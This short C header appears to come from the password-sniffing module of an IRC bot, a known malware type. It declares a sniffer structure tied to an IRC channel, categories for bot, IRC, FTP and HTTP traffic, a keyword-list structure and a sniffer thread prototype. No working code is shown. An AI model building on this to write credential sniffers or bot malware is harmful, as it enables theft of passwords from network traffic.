#ifndef NO_PSNIFF
// sniffing structure
typedef struct PSNIFF
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	bool notice;
	bool silent;
	bool gotinfo;

} PSNIFF;

enum {BOTP,IRCP,FTPP,HTTPP};

typedef struct PSWORDS
{
	char text[20];
	int type;

} PSWORDS;


DWORD WINAPI SniffThread(LPVOID param);
#endif
